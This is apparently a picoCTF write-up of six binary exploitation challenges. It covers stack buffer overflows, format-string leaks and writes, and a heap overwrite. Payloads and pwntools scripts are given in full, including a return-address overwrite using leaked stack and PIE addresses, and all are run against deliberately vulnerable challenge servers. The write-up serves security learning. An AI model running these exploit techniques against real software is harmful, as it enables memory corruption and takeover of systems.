# Binary Exploitation

## 1. buffer overflow 0

The challenge is to overflow the correct buffer to get the flag. We have the source code file with the executable (same as the one that is running on the instance with the actual flag file)

- Source Code: [vuln.c](./buf0/vuln.c)
- Executable: [vuln](./buf0/vuln)

### My Solution

**Flag:**`picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`

**Steps:**
- My first step was to analyse the executable file for which I ran the `file` and `checksec` commands

```bash
$ file vuln
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
```

```bash
$ checksec --file=vuln
```
![checksec](./buf0/checksec.png "checksec")

- The analysation reveals that the file:
    - is not-stripped so maybe we can use this to our help in future steps
    - is an executable that is Position Independent 
    - runs on the 32-bit calling convention
    - NX is enebled which prevents data of the program being used for execution (it means that certain parts of the program are not executable)
    - there is No canary found which is good for us as we don't need to worry about bypassing stack canaries 
    - Full RELRO is enebled which makes GOT read only and hence we can't perform a GOT overwrite attack

- Now I went and analysed the code from `vuln.c`
    - We can see that there is a signal handler that is running after the program starts which literally prints the `flag.txt` file when the signal `SIGSEGV` is recieved which is the signal for `Segmentation Fault`
    - We can also observe that `gets()` function is being used which is a vulnerable funciton as it has no checking for buffer size, now the data from input is being put into the buffer `buf1` which has a size of `100` now we could overflow this buffer and it may give us the flag
    - But, we could also overflow the buffer `buf2` which has a size of `16` which also could give us the flag (`strcpy()` is also a vulnerable function)

- Now segfault may not directly be triggered after the size of the buffer is crossed as the offset that triggers the segfault could be different than the value of buffer_size. Hence, any value substantially greater than `16` should crash the program and give us the flag

- So, I tried using the payload `aaaaaaaaaaaaaaaaaaaa` which is `a` repeated `20` times

- Next I created a `flag.txt`, made the execution of `vuln` possible and ran it to test my exploit

```bash
$ chmod +x vuln
$ touch flag.txt
$ echo "SUCCESS" > flag.txt
```

```bash
$ ./vuln
Input: aaaaaaaaaaaaaaaaaaaa
SUCCESS
```

- Now we have our payload so I connected to the picoctf server using netcat and used the payload to get the flag
```bash
$ nc saturn.picoctf.net 59864
Input: aaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## 2. format string 0

The challenge is to use format string to exploit the program and get the flag

- Source Code: [format-string-0.c](./formatstr0/format-string-0.c)
- Binary: [format-string-0](./formatstr0/format-string-0)

### My Solution

**Flag:**`picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}`

**Steps:**
- My first step was to analyse the executable file for which I ran the `file` and `checksec` commands

```bash
$ file format-string-0
format-string-0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=73480d84a806aebddd86602609fcab2052c8fa13, for GNU/Linux 3.2.0, not stripped
```

```bash
$ checksec --file=format-string-0
```
![checksec](./formatstr0/checksec.png "checksec")

- The analysation reveals that the file:
    - is not-stripped so maybe we can use this to our help in future steps
    - is an executable that is not Position Independent 
    - runs on the 64-bit calling convention
    - NX is enebled which prevents data of the program being used for execution (it means that certain parts of the program are not executable)
    - there is No canary found which is good for us as we don't need to worry about bypassing stack canaries 
    - Partial RELRO is enebled  

- Now I went and analysed the code from `format-string-0.c`
    - We can see that there is a signal handler that is running after the program starts which literally prints the `flag` when the signal `SIGSEGV` is recieved which is the signal for `Segmentation Fault`
    - We can also observe that `printf` is being called with a string literal in both the `serve_patrick` and `serve_bob` functions on lines `68` and `98` respectively which is potentially helpful
    - The main function calls `serve_patrick` function, which requires the burger choice `choice1` to be in the given options and the `printf(choice1)` to be greater than `2*BUFSIZE` which is `2*32` so we choose `Gr%114d_Cheese` as our input as the `%114d` expands to a string of 114 spaces
    - Then this calls the `serve_bob` function where to exploit it we can use the choice `Cla%sic_Che%s%steak` which tries to call add the strings in places where `%s` is there but the strings do not exist and it should crash the program and give us a segfault

- Next I created a `flag.txt`, made the execution of `format-string-0` possible and ran it to test my exploit

```bash
$ chmod +x format-string-0
$ touch flag.txt
$ echo "SUCCESS" > flag.txt
```

```bash
$ ./format-string-0
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
SUCCESS
```

- Finally, I connected to the picoctf server using netcat and used the payloads to get the flag
```bash
$ nc mimas.picoctf.net 62394
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```

## 3. clutter-overflow

The challenge is to use buffer overflow to set the `code` variable to `0xdeadbeef`

- Source Code: [chall.c](./clutteroverflow/chall.c)
- Binary: [chall](./clutteroverflow/chall)

### My Solution

**Flag:**`picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}`

**Steps:**
- My first step was to analyse the executable file for which I ran the `file` and `checksec` commands

```bash
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=181b4752cc92cfa231c45fe56676612e0ded947a, not stripped
```

```bash
$ checksec --file=chall
```
![checksec](./clutteroverflow/checksec.png "checksec")

- The analysation reveals that the file:
    - is not-stripped so maybe we can use this to our help in future steps
    - is an executable that is not Position Independent 
    - runs on the 64-bit calling convention
    - NX is enebled which prevents data of the program being used for execution (it means that certain parts of the program are not executable)
    - there is No canary found which is good for us as we don't need to worry about bypassing stack canaries 
    - Partial RELRO is enebled  

- Now I went and analysed the code from `chall.c`
    - There is a use of `gets` which could potentially be helpful in overflowing the buffer `clutter` with the size `0x100` or `256`
    - Also, we can observe that we get the flag if `code` is equal to the `GOAL` which is `0xdeadbeef`

- Next I tried to find out how long the input size needs to be to change the `code` variable using the pwntools cyclic string

```python
>>> from pwn import *
>>> cyclic(300)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac'
```
- The code value was `0x6361617263616171` which means the offset to RIP becomes `264`

```python
>>> cyclic_find(0x6361617263616171)
264
```

- So, our payload becomes `b'a'*264 + p64(0xdeadbeef)`

- Next I wrote a python script to use the payload

> _soln.py_
```python
from pwn import *

elf = ELF("./chall")
p = elf.process()

offset = 264

print(p.recvuntil("see?\n"))

payload = [
    b"a"*offset,
    p64(0xdeadbeef),
]

payload = b"".join(payload)
p.sendline(payload)

p.interactive()
```

- Next I created a `flag.txt`, made the execution of `chall` possible and ran it to test my exploit

```bash
$ chmod +x chall
$ touch flag.txt
$ echo "SUCCESS" > flag.txt
```

```bash
$ python3 soln.py
[*] 'chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process 'chall': pid xxxxx
...
""\nMy room is so cluttered...\nWhat do you see?\n'
[*] Switching to interactive mode
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
SUCCESS
[*] Got EOF while reading in interactive
$
```

- Finally, I connected to the picoctf server using netcat and used the python script to get the flag

> _soln.py_
```python
# (-) lines removed
elf = ELF("./chall")
p = elf.process()
# (+) lines added
p = remote("mars.picoctf.net", 31890)
```

```bash
$ python3 soln.py
```

![output](./clutteroverflow/output.png "q3-soln-output")

## BONUS 1. flag leak

In this challenge

- Source Code: [vuln.c](./flagleak/vuln.c)
- Binary: [vuln](./flagleak/vuln)

### My Solution

**Flag:**`picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}`

**Steps:**
- My first step was to analyse the executable file for which I ran the `file` and `checksec` commands

```bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=17bb7adc72aff4022d6a1c451eb9adcf34df2f8c, for GNU/Linux 3.2.0, not stripped
```

```bash
$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   78 Symbols        No    0               2               vuln
```

- The analysation reveals that the file:
    - is not-stripped so maybe we can use this to our help in future steps
    - is an executable that is not Position Independent 
    - runs on the 32-bit calling convention
    - NX is enebled which prevents data of the program being used for execution (it means that certain parts of the program are not executable)
    - there is No canary found which is good for us as we don't need to worry about bypassing stack canaries 
    - Partial RELRO is enebled  

- Now I went and analysed the code from `vuln.c`
    - There is a function being used called `setvbuf` which I didn't know about so I went and checked it's manpages using the following command
    ```bash
    $ man 3 setvbuf
    ```
    - After all the setup in main, the main function calls the `vuln` function and this function has a potential vulnerability of format strings we could exploit in near future
    - And I saw a `readflag` function which reads out the flag

- Next I created a `flag.txt`, and made the execution of `vuln` possible

```bash
$ touch flag.txt
$ echo "SUCCESS" > flag.txt
$ chmod +x vuln
```

- So, our attack vector is the format string which means we can read the positional arguments which lead to a memory leak and potential printing of the flag using a payload such as this `%i$s` where i refers to the i-th positional argument

- Next I wrote a simple bash script to solve this chall and tested it

> _soln.sh_
```bash
#!/bin/bash
for i in {0..64}; do echo "%$i\$s" | ./vuln | grep SUCCESS; done
```

```bash
$ bash soln.sh
SUCCESS
```

- Next I updated the bash script and ran it to get the flag

> _soln.sh_
```bash
#!/bin/bash
#for i in {0..64}; do echo "%$i\$s" | ./vuln | grep SUCCESS; done
for i in {0..256}; do echo "%$i\$s" | nc saturn.picoctf.net 59111 | grep CTF; done
```

- Here I used `CTF` to match to data using grep because `pico` was giving me only one part of the flag (the flag size that is being leaked is only `64` in length at a time)

## BONUS 2. Echo Valley 

In this challenge

- Source Code: [valley.c](./echovalley/valley.c)
- Binary: [valley](./echovalley/valley)

### My Solution

**Flag:**`picoctf{f1ckl3_f0rmat_f1asc0}`

**Steps:**
- My first step was to analyse the executable file for which I ran the `file` and `checksec` commands

```bash
 $ file valley
valley: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=389c2641f0d3caae81af5d21d9bb5bcf2de217f0, for GNU/Linux 3.2.0, with debug_info, not stripped
```

```bash
$ checksec --file=valley
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   49 Symbols        No    0               2               valley
```

- The given file is a 64-bit ELF executable and for the given file all protection are turned on but we still have'nt checked out the source code

- When we checkout the source code we see that there is a format string vulnerability that we can use as our attack vector

- Next I thought of a way to leak the stack and pie through the use of format string and I thought of pointers `%p`

- So I enebled execution for the `valley` file using `chmod` and opened it up in `pwngdb`

```bash
$ chmod +x valley
```

```bash
$ pwndbg valley
pwndbg: loaded 211 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from valley...
------- tip of the day (disable with set show-tips off) -------
Want to display each context panel in a separate tmux window? See https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md#splitting--layouting-context
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000001401 <+0>:     endbr64
   0x0000000000001405 <+4>:     push   rbp
   0x0000000000001406 <+5>:     mov    rbp,rsp
   0x0000000000001409 <+8>:     mov    eax,0x0
   0x000000000000140e <+13>:    call   0x1307 <echo_valley>
   0x0000000000001413 <+18>:    mov    eax,0x0
   0x0000000000001418 <+23>:    pop    rbp
   0x0000000000001419 <+24>:    ret
End of assembler dump.
pwndbg> r
```

- On running the program I fed it the input: `%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p` and got the output

```
You heard in the distance:  0x7fffffffd980 (nil) (nil) (nil) 0x410 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x702520 0x5ba49d1e879e0700 0x7fffffffdbb0 0x555555555413 0x7fffffffdc50 0x7ffff7c2a1ca 0x7fffffffdc00 0x7fffffffdcd8 0x155554040 0x555555555401 0x7fffffffdcd8 0xab29d2e2ba11ae86 0x1 (nil) 0x555555557d78 0x7ffff7ffd000You heard in the distance:  0x7fffffffd980 (nil) (nil) 0x555555559765 (nil) 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070000a70 0x7025207025207025 0x702520 0x5ba49d1e879e0700 0x7fffffffdbb0 0x555555555413 0x7fffffffdc50 0x7ffff7c2a1ca 0x7fffffffdc00 0x7fffffffdcd8 0x155554040 0x555555555401
```

- Then I disassembled main again to look for changes

```bash
pwndbg> disas main
Dump of assembler code for function main:
   0x0000555555555401 <+0>:     endbr64
   0x0000555555555405 <+4>:     push   rbp
   0x0000555555555406 <+5>:     mov    rbp,rsp
   0x0000555555555409 <+8>:     mov    eax,0x0
   0x000055555555540e <+13>:    call   0x555555555307 <echo_valley>
   0x0000555555555413 <+18>:    mov    eax,0x0
   0x0000555555555418 <+23>:    pop    rbp
   0x0000555555555419 <+24>:    ret
End of assembler dump.
```

- From this we can see that on the 21st %p we are getting a pie leak and before that the stack is leaking so we can use this and change the return address to call the print_flag function
- We can also see that the stack leak addr we are getting is 8 more than the mov instruction addr which allows us to do a rop attack

- Then I ran `vmmap` with the address of the pie leak to get the pie base address

```bash
pwndbg> vmmap 0x555555555413
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
    0x555555554000     0x555555555000 r--p     1000       0 valley
►   0x555555555000     0x555555556000 r-xp     1000    1000 valley +0x413
    0x555555556000     0x555555557000 r--p     1000    2000 valley
```

- We see that the offset to the leaking address from the base address is `+0x1413` (offset of 1000 + 0x413) and we know that print_flag function is in the symbols so we can also get it's address from there

- Next I checked where our input is from and we see that it is starting from the sixth leaked address

- Next I created a python script to run an exploit to set the return address to the address of print_flag function

> _soln.py_
```python
from pwn import *

f = "valley"

context.arch = 'amd64'

elf = ELF(f)
r = process(f)

# r = remote('shape-facility.picoctf.net', 56490)

r.sendline("%20$p %21$p")
r.recvuntil("distance: ")

# leaks
stack, pie = r.recvline().split()

stack, pie = int(stack, 16), int(pie, 16)

elf.address = pie - 0x1413

print_flag_addr = elf.sym.print_flag

print(print_flag_addr)

payload = fmtstr_payload(6, {stack-8 : elf.sym.print_flag}, write_size='short')

r.sendline(payload)
r.sendline('exit')

r.interactive()
```

- Ran it and checked it locally (locally didn't create a flag because I would've had to put it in the /home/valley directory and I didn't want to create a new user for this)

- Finally I ran it on the given endpoint instance and got the flag

```bash
$ python3 soln.py
[*] '/valley'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to shape-facility.picoctf.net on port 56490: Done
...
    \x00a\x88Go\x0c\xfcThe Valley Disappears
Congrats! Here is your flag: picoctf{f1ckl3_f0rmat_f1asc0}
```

## BONUS 3. heap 1

In this challenge

- Source Code: [chall.c](./heap1/chall.c)
- Binary: [chall](./heap1/chall)

### My Solution

**Flag:**`picoCTF{starting_to_get_the_hang_b9064d7c}`

**Steps:**
- My first step was to analyse the executable file for which I ran the `file` and `checksec` commands

```bash
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e191661a34476dabf75adb49242d4b71521a6295, for GNU/Linux 3.2.0, with debug_info, not stripped
```

```bash
$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   53 Symbols        No    0               2               chall
```

- The given file is a 64-bit ELF executable and for the given file protection canary is not found and the relro is partial but we still have'nt checked out the source code

- When we checkout the source code we see that
    - There is a check_win function which will print the flag for us if the `safe_var` is `pico`
    - Initially in the main function the `input_data` is `pico` and `safe_var` is `bico` which have both been malloc-ed in the heap
    - we can write to the `input_data` a buffer from user input and this buffer is being written using scanf as a string
    - but there isn't a specification on the limit of data the buffer takes so we can directly overwrite the `safe_var` variable as we know it's location from the `print_heap` facility

- My attack vector becomes the scanf while writing to input_data and my payload becomes `(safe_var address - input_data address)*'a' + 'pico'`

- Next I run the attack locally to test it

```bash
$ ./chall

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5f75305466b0  ->   pico
+-------------+----------------+
[*]   0x5f75305466d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit
```

_Meanwhile in another console_
```python
>>> 0x5f75305466d0 - 0x5f75305466d0
0
>>> 0x5f75305466b0 - 0x5f75305466d0
-32
>>> 32*'a' + 'pico'
'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico'
```

_Back to the main console_
```bash
Enter your choice: 2
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = pico


1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
Segmentation fault (core dumped) 
```

- Finally I ran it on the endpoint given in the challenge and got the flag

```bash
$ nc tethys.picoctf.net 52642

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5acf52a352b0  ->   pico
+-------------+----------------+
[*]   0x5acf52a352d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit
```

_Meanwhile in another console_
```python
>>> 0x5f75305466d0 - 0x5f75305466d0
0
>>> 0x5f75305466b0 - 0x5f75305466d0
-32
>>> 32*'a' + 'pico'
'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico'
```

_Back to the main console_
```bash
Enter your choice: 2
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = pico


1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_b9064d7c}
```

